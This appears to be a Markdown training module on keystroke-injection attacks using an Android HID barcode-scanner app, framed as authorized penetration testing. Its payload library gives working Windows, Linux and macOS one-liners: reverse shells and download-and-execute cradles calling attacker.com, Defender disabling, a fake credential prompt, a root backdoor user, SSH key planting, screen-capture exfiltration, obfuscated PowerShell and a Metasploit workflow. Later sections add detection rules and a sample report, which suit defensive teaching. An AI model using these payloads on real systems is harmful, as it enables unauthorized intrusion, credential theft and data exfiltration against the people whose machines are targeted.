# Using HID Barcode Scanner for Security Testing

## Overview

This module focuses on practical security testing using the HID Barcode Scanner app. You'll learn how to use this tool for authorized penetration testing, security research, and defensive security assessments.

## Table of Contents

1. [HID Scanner as a Security Tool](#hid-scanner-as-a-security-tool)
2. [Setting Up for Security Testing](#setting-up-for-security-testing)
3. [Creating Test Payloads](#creating-test-payloads)
4. [Advanced Techniques](#advanced-techniques)
5. [Integration with Security Frameworks](#integration-with-security-frameworks)
6. [Defensive Testing](#defensive-testing)
7. [Documentation and Reporting](#documentation-and-reporting)

## HID Scanner as a Security Tool

### Why Use HID Barcode Scanner for Pentesting?

The HID Barcode Scanner app is valuable for security testing because:

1. **Legitimate Tool**: Not inherently malicious, making it less suspicious
2. **Flexible Input**: Can inject any sequence of keystrokes
3. **Template System**: Advanced scripting capabilities
4. **RFCOMM Mode**: Alternative to HID for different test scenarios
5. **Cross-Platform**: Works on Windows, Linux, macOS
6. **Open Source**: Auditable and customizable
7. **Educational**: Demonstrates real attack techniques

### Ethical Use Cases

**Authorized Pentesting**:
- Red team engagements
- Physical penetration tests
- Social engineering assessments
- Security awareness training
- Compliance testing (PCI-DSS, etc.)

**Security Research**:
- Testing endpoint security controls
- Evaluating EDR/antivirus effectiveness
- Developing defensive signatures
- Academic research

**Defensive Testing**:
- Testing security controls
- Validating detection capabilities
- Training SOC analysts
- Incident response drills

## Setting Up for Security Testing

### Essential Configuration

**1. Device Naming**

Make device name non-suspicious for physical tests:

Settings > Device Name:
- ❌ Bad: "HACKING DEVICE"
- ✓ Good: "Wireless Scanner" or manufacturer name

**2. Layout Configuration**

Match target environment:
- Corporate (US): US QWERTY
- European: German QWERTZ, French AZERTY, etc.
- Verify with test input before engagement

**3. Connection Mode**

Choose based on test objective:

**HID Mode**: For testing:
- Keystroke injection defenses
- Endpoint security products
- User awareness
- Input validation

**RFCOMM Mode**: For testing:
- Application-layer authorization
- COM port security
- Serial communication handling
- Alternative input methods

**4. Custom Keys Setup**

Configure shortcuts for common payloads:

Settings > Custom Keys:
```
Name: "Win CMD"
Keys: {{GUI}}r{{DELAY 500}}cmd{{ENTER}}{{DELAY 500}}

Name: "Linux Terminal"
Keys: {{CTRL}}{{ALT}}t{{DELAY 500}}

Name: "Quick Exit"
Keys: {{ALT}}{{F4}}
```

### Test Environment Setup

**Virtual Lab**:
```bash
# Set up isolated VMs
# Windows 10/11 VM
# Linux Ubuntu/Kali VM
# macOS VM (if testing Apple environments)

# Install monitoring tools
# Windows: Sysmon, Process Monitor
# Linux: auditd, syslog
# Network: Wireshark, tcpdump

# Configure logging
# Ensure all actions are logged for analysis
```

**Physical Test Lab**:
- Dedicated test workstations
- Network monitoring (SPAN/mirror port)
- Video recording for documentation
- Isolated network segment

## Creating Test Payloads

### Payload Development Process

**1. Define Objective**
- What are you testing?
- What should the payload accomplish?
- What defenses should it bypass?

**2. Choose Technique**
- Direct command execution
- Download and execute
- Registry manipulation
- Fileless execution
- Living off the land (LOLBins)

**3. Develop Payload**
- Write and test locally
- Optimize for speed and reliability
- Add cleanup/rollback if needed

**4. Encode for HID**
- Convert to template syntax
- Add appropriate delays
- Test keyboard layout compatibility

### Payload Library

#### Windows Payloads

**Reverse Shell (PowerShell)**:
```
{{GUI}}r{{DELAY 500}}powershell -W Hidden -NoP -NonI -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"{{ENTER}}
```

**User Enumeration**:
```
{{GUI}}r{{DELAY 500}}powershell{{ENTER}}{{DELAY 1000}}Get-LocalUser | Export-Csv $env:TEMP\users.csv{{ENTER}}Start-Process $env:TEMP\users.csv{{ENTER}}
```

**Disable Windows Defender (requires admin)**:
```
{{GUI}}r{{DELAY 500}}powershell -W Hidden{{ENTER}}{{DELAY 1000}}Set-MpPreference -DisableRealtimeMonitoring $true{{ENTER}}
```

**Credential Harvesting (Fake UAC)**:
```
{{GUI}}r{{DELAY 500}}powershell{{ENTER}}{{DELAY 1000}}$cred = $host.ui.PromptForCredential("Windows Security", "Enter your credentials", $env:USERNAME, ""){{ENTER}}$cred.GetNetworkCredential().Password | Out-File $env:TEMP\creds.txt{{ENTER}}
```

**Background Payload Execution**:
```
{{GUI}}r{{DELAY 500}}powershell -W Hidden "Start-Process powershell -Args '-NoP -W Hidden -C IEX(wget attacker.com/payload.ps1 -UseBasicParsing)' -WindowStyle Hidden"{{ENTER}}
```

#### Linux Payloads

**Reverse Shell**:
```
{{CTRL}}{{ALT}}t{{DELAY 500}}bash -i >& /dev/tcp/attacker.com/4444 0>&1{{ENTER}}
```

**Add Backdoor User**:
```
{{CTRL}}{{ALT}}t{{DELAY 500}}echo 'backdoor:x:0:0::/root:/bin/bash' | sudo tee -a /etc/passwd{{ENTER}}
```

**Download and Execute**:
```
{{CTRL}}{{ALT}}t{{DELAY 500}}wget http://attacker.com/payload.sh -O /tmp/p.sh && chmod +x /tmp/p.sh && /tmp/p.sh{{ENTER}}
```

**SSH Key Installation**:
```
{{CTRL}}{{ALT}}t{{DELAY 500}}mkdir -p ~/.ssh && echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys{{ENTER}}
```

#### macOS Payloads

**Open Terminal & Execute**:
```
{{GUI}}{{SPACE}}{{DELAY 300}}terminal{{DELAY 300}}{{ENTER}}{{DELAY 500}}curl http://attacker.com/payload.sh | bash{{ENTER}}
```

**Capture Screen**:
```
{{GUI}}{{SPACE}}{{DELAY 300}}terminal{{DELAY 300}}{{ENTER}}{{DELAY 500}}screencapture -x /tmp/screen.png && curl -F 'file=@/tmp/screen.png' http://attacker.com/upload{{ENTER}}
```

### Template Syntax Reference

```
Modifier Keys:
{{CTRL}}    - Control
{{ALT}}     - Alt
{{GUI}}     - Windows/Command/Super key
{{SHIFT}}   - Shift

Special Keys:
{{ENTER}}   - Enter/Return
{{TAB}}     - Tab
{{ESC}}     - Escape
{{SPACE}}   - Space
{{UP}}      - Arrow Up
{{DOWN}}    - Arrow Down
{{LEFT}}    - Arrow Left
{{RIGHT}}   - Arrow Right
{{HOME}}    - Home
{{END}}     - End
{{PAGEUP}}  - Page Up
{{PAGEDOWN}}- Page Down
{{DELETE}}  - Delete
{{BACKSPACE}}- Backspace
{{INSERT}}  - Insert
{{F1}}-{{F12}} - Function keys

Timing:
{{DELAY 500}} - Delay 500ms
{{REPEAT 3}}text{{/REPEAT}} - Repeat "text" 3 times

Variables (if supported):
{{TARGET_IP}}
{{USERNAME}}
```

### Advanced Payload Techniques

#### Multi-Stage Payloads

**Stage 1: Establish foothold**
```
{{GUI}}r{{DELAY 500}}powershell -W Hidden -C "IWR http://attacker.com/stage2.ps1 -OutFile $env:TEMP\s2.ps1; Start-Process powershell -Args $env:TEMP\s2.ps1 -WindowStyle Hidden"{{ENTER}}
```

**Stage 2 (stage2.ps1)**:
```powershell
# More complex payload
# - Establish persistence
# - Download additional tools
# - Connect to C2 server
```

#### Evasion Techniques

**Obfuscated PowerShell**:
```
{{GUI}}r{{DELAY 500}}powershell{{ENTER}}{{DELAY 1000}}$a='IEX(New-Object Net.WebClient).Downl'+'oadString(''http://attacker.com/s.ps1'')';IEX $a{{ENTER}}
```

**Base64 Encoding**:
```
{{GUI}}r{{DELAY 500}}powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AcwAuAHAAcwAxACcAKQA={{ENTER}}
```

#### Platform Detection

**Auto-detect OS and execute appropriate payload**:

```javascript
// Using JavaScript engine (if HID Scanner supports)
function getOS() {
    // Send platform-agnostic command to determine OS
    // Parse output
    // Execute OS-specific payload
}
```

## Advanced Techniques

### Using RFCOMM Mode for Stealthy Operations

**Setup**:
1. Configure HID Scanner to RFCOMM mode
2. Target establishes COM port connection
3. Data sent silently without visible keystrokes

**Advantages for Testing**:
- No visible keyboard input
- Bypasses HID-specific defenses
- Tests different attack vector
- Useful for long-running operations

**Example: Silent Data Exfiltration**:

Target system (PowerShell receiving from COM port):
```powershell
$port = New-Object System.IO.Ports.SerialPort
$port.PortName = "COM3"
$port.BaudRate = 9600
$port.Open()

while ($true) {
    $data = $port.ReadLine()
    
    # Execute commands received via RFCOMM
    $result = Invoke-Expression $data
    
    # Send result back
    $port.WriteLine($result)
}
```

### Chaining with HID Scanner

**Scenario**: Use barcode scanning as legitimate function, inject commands opportunistically

1. **Normal Operation**: Scan barcodes for inventory
2. **Special Trigger**: Scan specific barcode pattern
3. **Payload Execution**: Trigger security test payload
4. **Resume Normal**: Continue normal scanning

**Implementation**:
```
Settings > JavaScript Engine:

function processScan(barcode) {
    if (barcode === "SECURITY_TEST_TRIGGER") {
        // Execute test payload
        return "{{GUI}}r{{DELAY 500}}notepad{{ENTER}}{{DELAY 500}}Security test executed at " + new Date();
    } else {
        // Normal barcode processing
        return barcode;
    }
}
```

### Integration with Metasploit

**Objective**: Use HID injection to establish Metasploit session

**1. Generate Payload**:
```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f psh -o payload.ps1
```

**2. Host Payload**:
```bash
python3 -m http.server 8080
```

**3. Setup Handler**:
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
exploit -j
```

**4. HID Injection**:
```
{{GUI}}r{{DELAY 500}}powershell -W Hidden -C "IEX(IWR -UseBasicParsing http://attacker.com:8080/payload.ps1)"{{ENTER}}
```

## Defensive Testing

### Testing Detection Capabilities

**Objective**: Verify that security controls detect HID injection

**Test Cases**:

**1. Rapid Keystroke Detection**:
```python
# Generate HID payload with no delays
test_payload = "".join([f"{{CHAR {c}}}" for c in "TEST STRING"])

# Expected: EDR/monitoring should flag rapid typing
```

**2. Suspicious Command Detection**:
```
# Test if these get flagged:
powershell -EncodedCommand ...
powershell -ExecutionPolicy Bypass ...
IEX (New-Object Net.WebClient)...
cmd /c "..."
certutil -urlcache -split -f http://...
```

**3. Process Creation Monitoring**:
```
# Verify logging of:
- PowerShell launches
- CMD launches
- Script execution
- Unusual parent-child process relationships
```

**4. Network Connection Monitoring**:
```
# Test if outbound connections are logged:
- PowerShell downloading files
- Connections to external IPs
- Uncommon ports
```

### Building Detection Rules

**Sysmon Configuration** (Windows):
```xml
<Sysmon schemaversion="4.70">
  <EventFiltering>
    <!-- Log all process creation -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">powershell</CommandLine>
      <CommandLine condition="contains">cmd.exe</CommandLine>
    </ProcessCreate>
    
    <!-- Log suspicious network connections -->
    <NetworkConnect onmatch="include">
      <Image condition="contains">powershell.exe</Image>
      <Image condition="contains">cmd.exe</Image>
    </NetworkConnect>
    
    <!-- Log file creation in temp directories -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">\Temp\</TargetFilename>
      <TargetFilename condition="contains">\AppData\Local\Temp\</TargetFilename>
    </FileCreate>
  </EventFiltering>
</Sysmon>
```

**SIGMA Rule** (Generic):
```yaml
title: Suspicious HID Injection Activity
description: Detects rapid keyboard input indicative of HID injection
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains:
      - 'powershell'
      - '-W Hidden'
      - '-EncodedCommand'
      - 'IEX'
      - 'DownloadString'
  condition: selection
falsepositives:
  - Legitimate administrative scripts
level: medium
```

## Documentation and Reporting

### Penetration Test Documentation

**Test Report Structure**:

1. **Executive Summary**
   - Scope of testing
   - Key findings (high-level)
   - Risk summary
   - Recommendations

2. **Technical Findings**
   - Vulnerability: HID Injection
   - Severity: High
   - Description: Detailed explanation
   - Proof of Concept: Step-by-step with screenshots
   - Impact: What attacker can achieve
   - Remediation: Specific recommendations

3. **Evidence**
   - Screenshots
   - Command outputs
   - Log excerpts
   - Video recordings

### Sample Finding Write-Up

**Finding: Insufficient HID Device Controls**

**Severity**: High

**Description**:
The organization's workstations do not implement controls to prevent unauthorized HID device connections. During testing, an Android device running HID Barcode Scanner was able to:
1. Pair with unlocked workstations without user confirmation
2. Inject arbitrary keystrokes
3. Execute commands with logged-in user privileges
4. Exfiltrate data via PowerShell

**Proof of Concept**:
```
1. Configured Android device with HID Barcode Scanner
2. Approached unlocked workstation (Finance department)
3. Initiated Bluetooth pairing
4. Injected payload: [REDACTED]
5. Obtained user credentials and sensitive files
6. Time to compromise: < 2 minutes
```

**Impact**:
An attacker with physical proximity to an unlocked workstation can:
- Execute arbitrary commands
- Install malware or backdoors
- Exfiltrate sensitive data
- Establish persistent access
- Escalate privileges

**Affected Systems**:
- All Windows 10 workstations (Finance, HR, IT)
- Some Linux workstations (Development)
- Executive laptops

**Remediation**:

**Short-term** (1-2 weeks):
1. Implement mandatory screen lock policy (5 minutes idle)
2. Enable Bluetooth device approval requirement
3. Deploy USB/Bluetooth whitelisting
4. Security awareness training on HID attacks

**Medium-term** (1-3 months):
1. Deploy endpoint detection and response (EDR) solution
2. Implement application whitelisting
3. Configure PowerShell constrained language mode
4. Enable command-line auditing

**Long-term** (3-6 months):
1. Implement zero-trust architecture
2. Deploy privileged access management (PAM)
3. Hardware-based device authentication
4. Physical security improvements (badge-controlled areas)

**References**:
- MITRE ATT&CK Technique: T1056.001 (Input Capture: Keylogging)
- CWE-1188: Insecure Default Initialization of Resource
- NIST SP 800-171: Access Control

## Best Practices

### For Red Team

1. **Always Get Authorization**: Written permission before any testing
2. **Scope Clearly**: Know what's in/out of scope
3. **Document Everything**: Screenshots, logs, commands
4. **Clean Up**: Remove any backdoors/files created
5. **Communicate**: Keep client informed of progress
6. **Physical Safety**: Be aware of physical security concerns
7. **Legal Compliance**: Follow all applicable laws

### For Blue Team

1. **Test Regularly**: Continuous security validation
2. **Layered Defense**: Don't rely on single control
3. **Monitor Actively**: Real-time detection and response
4. **Update Regularly**: Keep signatures and rules current
5. **Train Users**: Awareness is critical defense
6. **Incident Response**: Have plan for when attack succeeds
7. **Continuous Improvement**: Learn from each test

## Quiz

1. What are three legitimate use cases for HID injection testing?
2. Why is device naming important during physical penetration tests?
3. What are the advantages of RFCOMM mode over HID mode for certain tests?
4. How can you test if security controls detect rapid keystroke injection?
5. What should be included in a penetration test report finding?
6. Name three defensive measures against HID attacks.
7. How can HID Scanner be integrated with Metasploit?
8. What is the purpose of multi-stage payloads?

## Next Steps

- [Exercise 1: HID Injection Basics →](exercises/ex01-hid-injection-basics.md)
- [RFCOMM Advanced Testing →](05-rfcomm-advanced-testing.md)

## Resources

- [HID Barcode Scanner Documentation](../README.md)
- [MITRE ATT&CK - Input Capture](https://attack.mitre.org/techniques/T1056/)
- [Red Team Field Manual](https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504)

---

[← Back: BLE Attack Vectors](03-ble-attack-vectors.md) | [Next: RFCOMM Advanced Testing →](05-rfcomm-advanced-testing.md)
